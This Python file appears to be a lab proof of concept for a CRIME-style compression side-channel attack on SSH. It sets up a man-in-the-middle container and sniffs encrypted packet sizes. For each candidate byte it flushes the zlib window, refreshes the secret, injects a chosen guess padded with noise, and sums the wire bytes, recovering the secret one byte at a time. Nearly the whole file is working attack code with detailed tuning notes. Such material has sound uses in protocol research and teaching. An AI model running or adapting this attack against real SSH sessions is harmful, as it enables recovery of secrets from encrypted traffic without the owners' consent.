"""CRIME-style chosen-payload attack against SSH compression.

The PoC sits inside the attacker container and runs entirely passively
at the wire layer: it never decrypts SSH, never runs its own zlib, and
never asks the client for the secret value.  All it does is

  1. Trigger the client to push the secret onto its session channel
     (this refreshes the LZ77 sliding window so the secret sits at a
     known, *small*, near-constant distance for the next measurement).
  2. Trigger the client to send a chosen guess on the *other* session
     channel.  The two channels share one zlib compression context per
     direction, so the LZ77 dictionary populated by step 1 is visible
     to step 2.
  3. Read the size of the resulting encrypted SSH binary packet from
     the scapy AsyncSniffer running in the same container.

The right guess shares one extra byte with the secret in the LZ77
match-extension step, so its compressed payload is one byte smaller
than every wrong guess's.  chacha20-poly1305@openssh.com pads to
multiples of 8 bytes, so a 1-byte difference is invisible most of the
time -- but for at least one of the 8 possible alignments it crosses a
padding boundary and shows up as an 8-byte step on the wire.  We sweep
all 8 alignments by appending random noise of length 0..7 to each guess
and summing the wire sizes; the candidate with the smallest sum is the
recovered byte.

(This is the same idea as BREACH's "two tries" technique, tuned for
SSH BPP + chacha20-poly1305@openssh.com.)
"""

from __future__ import annotations

import asyncio
import logging
import os
import secrets
import time
from typing import Any

import aiohttp

LOG = logging.getLogger("attack")

CLIENT_BASE = os.environ.get("CLIENT_CONTROL_URL", "http://client:8000")
LISTEN_PORT = int(os.environ.get("LISTEN_PORT", "2222"))


def _c2s_total(records: list[dict[str, Any]]) -> int:
    """Sum c->s TCP payload bytes from one half of the forwarder.

    The MitM relays each SSH binary packet through both legs of the
    proxy, so summing every TCP segment would double-count.  We pick
    the half-flow where dport == LISTEN_PORT (client -> attacker) and
    ignore the other side.  Also drops pure-ACK segments (payload=0).
    """
    return sum(
        r["tcp_payload_len"] for r in records
        if r["dport"] == LISTEN_PORT and r["tcp_payload_len"] > 0
    )


async def _refresh_secret(
    session: aiohttp.ClientSession,
    packet_log,
    settle: float,
) -> None:
    """Trigger the client to push the secret onto the secret channel.

    This refreshes the LZ77 sliding window so the secret sits at the
    *most recent* end of the dictionary.  We do it before every guess
    so the LZ77 distance for the prefix match is approximately the
    same for the right and wrong candidates -- the only signal we
    want is the +1 length advantage from the matching byte.
    """
    packet_log.clear()
    async with session.post(f"{CLIENT_BASE}/send_secret") as r:
        await r.read()
    if settle > 0:
        await asyncio.sleep(settle)


async def _measure(
    session: aiohttp.ClientSession,
    packet_log,
    payload: bytes,
    settle: float,
) -> int:
    """Trigger the client to send a payload, return total c->s wire bytes."""
    packet_log.clear()
    async with session.post(
        f"{CLIENT_BASE}/send_attacker_payload",
        data=payload,
    ) as r:
        await r.read()
    if settle > 0:
        await asyncio.sleep(settle)
    return _c2s_total(packet_log.snapshot())


async def _flush_window(
    session: aiohttp.ClientSession,
    packet_log,
    flush_bytes: int,
    settle: float,
) -> None:
    """Push enough dummy bytes through the attacker channel to evict the
    prior guess from the LZ77 sliding window AND scramble zlib's
    internal hash-chain state.

    Two requirements on the dummy:

    1. **Length >= zlib window (32 KiB).**  Anything within 32 KiB of
       the new guess is still in the LZ77 sliding window and could be
       picked as a long backreference -- the previous guess BPP message
       is identical to the new one at every byte except the candidate
       byte, so without flushing the new guess just back-references
       the entire previous guess and there's no signal left.

    2. **Content must be random, NOT all-zeros.**  An all-zeros flush
       saturates zlib's hash chain for the `\\x00\\x00\\x00` 3-byte
       hash with thousands of in-window positions.  zlib's match
       search walks that chain up to `max_chain_length` (128 at level
       6) and gives up before reaching the optimal match position --
       which produces *sub-optimal* compression in a way that depends
       on the exact prior call sequence.  In the polluted state the
       compressed-byte progression for the right candidate then
       systematically skips the chacha20 padding boundary positions
       and the wire signal disappears.

       Random bytes don't share a common 3-byte hash, so every hash
       chain stays short and zlib finds the optimal match.  The
       compressed-byte progression matches the fresh-state predictions
       and the wire signal is preserved.
    """
    if flush_bytes <= 0:
        return
    # secrets.token_bytes is cryptographically random; we don't need
    # the strong-RNG guarantees but we do need *some* randomness.
    dummy = secrets.token_bytes(flush_bytes)
    async with session.post(
        f"{CLIENT_BASE}/send_attacker_payload",
        data=dummy,
    ) as r:
        await r.read()
    if settle > 0:
        await asyncio.sleep(settle)


def _make_noise(noise_len: int) -> bytes:
    """8-bit DEFLATE-literal noise (bytes 0x80..0x8F).

    Each noise byte adds *exactly* 8 bits = 1 byte to the compressed
    output (modulo Z_PARTIAL_FLUSH alignment slack), so the cmp byte
    count grows strictly linearly with no skipped values.  Sweeping
    16 noise lengths reliably hits every cmp value in a 16-byte
    range and therefore at least one chacha20 padding boundary --
    at the boundary, cmp = boundary - 1 for the right candidate
    and cmp = boundary for the wrong candidate, and that 1-byte
    compressed delta becomes an 8-byte wire delta.

    Constraints:

    * Each byte must be in the 8-bit fixed-Huffman literal class
      (DEFLATE assigns 8-bit codes to literals 0..143 and 9-bit
      codes to 144..255).  9-bit literals would shift the bit
      alignment by 1 bit per noise byte and break the
      strictly-linear cmp invariant.
    * Each byte must be distinct so no 3-byte intra-noise LZ77
      backreference can form.
    * Bytes must not appear in any plausible dictionary content
      (zeros, ASCII, IGNORE filler, SSH BPP wrappers) -- otherwise
      LZ77 might find a coincidental match and the noise byte
      would compress to nothing.

    The slice 0x80..0x8F satisfies all three.
    """
    if noise_len > 16:
        raise ValueError("noise_len too long for the 0x80..0x8F slice")
    return bytes(range(0x80, 0x80 + noise_len))


async def crack_byte_position(
    session: aiohttp.ClientSession,
    packet_log,
    prefix: bytes,
    alphabet: list[bytes],
    noise_lengths: list[int],
    settle: float,
    flush_bytes: int,
    log_prefix: str,
) -> tuple[bytes, dict[bytes, int]]:
    """Recover one byte at the given position by candidate scoring.

    For each candidate and each noise length, the attack runs:

      1. Flush the LZ77 window with random bytes so prior guesses
         can't be matched as long backreferences and so zlib's hash
         chain for any single 3-byte sequence stays short.
      2. Refresh the secret so it sits at the most-recent end of the
         (now-clean) dictionary, at a constant small distance for
         every candidate.
      3. Send `prefix + candidate + noise` and record the encrypted
         c->s wire bytes.

    The candidate with the smallest sum across all noise lengths is
    the recovered byte.

    Correctness: the right answer matches the secret with length L+1
    while a wrong answer matches length L plus a literal byte.  In
    DEFLATE fixed-Huffman the worst-case length-code-class transition
    adds only 1 bit, so the right answer is *always* at least 7 bits
    cheaper.  After Z_PARTIAL_FLUSH byte alignment a 7-bit saving
    sometimes hides inside the alignment slack, but a wrong candidate
    can *never* be cheaper than the right one -- only equal.
    Sixteen 8-bit-literal noise lengths reliably surface the saving
    as an 8-byte wire delta at *some* noise length.
    """
    sums: dict[bytes, int] = {c: 0 for c in alphabet}
    for noise_len in noise_lengths:
        # Same noise bytes for every candidate at this length so the
        # per-candidate comparison is fair.
        noise = _make_noise(noise_len)
        for cb in alphabet:
            await _flush_window(session, packet_log, flush_bytes, settle)
            await _refresh_secret(session, packet_log, settle)
            payload = prefix + cb + noise
            sums[cb] += await _measure(
                session, packet_log, payload, settle,
            )

    ranked = sorted(sums.items(), key=lambda kv: kv[1])
    best, best_sum = ranked[0]
    second, second_sum = ranked[1]
    LOG.info(
        "%s best=%r sum=%d  2nd=%r sum=%d  margin=%d",
        log_prefix,
        best.decode("latin-1"), best_sum,
        second.decode("latin-1"), second_sum,
        second_sum - best_sum,
    )
    return best, sums


async def run_attack(
    packet_log,
    known_prefix: bytes,
    alphabet_str: str = "abcdefghijklmnopqrstuvwxyz0123456789",
    max_length: int = 32,
    noise_lengths: list[int] | None = None,
    terminator: bytes = b"\n",
    settle: float = 0.005,
    flush_bytes: int = 33000,
) -> dict[str, Any]:
    if noise_lengths is None:
        # 0..15 spans two chacha20-poly1305@openssh.com padding bins
        # and gives every (cand, noise_len) sweep enough alignment
        # coverage to expose either an 8-bit or a 7-bit per-candidate
        # signal as a wire-side delta.  crack_byte_position() runs the
        # 8-bit-literal sweep first, then falls back to a 9-bit sweep
        # only if the first one was a tie.
        noise_lengths = list(range(16))
    alphabet = [bytes([c]) for c in alphabet_str.encode("utf-8")]
    if terminator not in alphabet:
        alphabet.append(terminator)

    LOG.info(
        "starting attack: known_prefix=%r alphabet_size=%d noise_lengths=%s "
        "max_length=%d settle=%.3f flush_bytes=%d",
        known_prefix, len(alphabet), noise_lengths, max_length, settle,
        flush_bytes,
    )

    started = time.time()
    recovered = b""
    history: list[dict[str, Any]] = []
    timeout = aiohttp.ClientTimeout(total=600)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        for pos in range(max_length):
            best, sums = await crack_byte_position(
                session, packet_log,
                prefix=known_prefix + recovered,
                alphabet=alphabet,
                noise_lengths=noise_lengths,
                settle=settle,
                flush_bytes=flush_bytes,
                log_prefix=f"pos {pos:2d}",
            )
            ranked = [
                (k.decode("latin-1"), v)
                for k, v in sorted(sums.items(), key=lambda kv: kv[1])
            ]
            history.append({
                "position": pos,
                "best": best.decode("latin-1"),
                "ranked": ranked[:6],  # top 6 to keep response small
            })
            if best == terminator:
                LOG.info("hit terminator at position %d -> done", pos)
                break
            recovered += best
            LOG.info("recovered so far: %r", recovered.decode("latin-1"))
        else:
            LOG.warning("hit max_length=%d without terminator", max_length)

    elapsed = time.time() - started
    LOG.info("attack done in %.1fs: recovered=%r",
             elapsed, recovered.decode("latin-1"))
    return {
        "recovered": recovered.decode("latin-1"),
        "elapsed_seconds": elapsed,
        "history": history,
    }
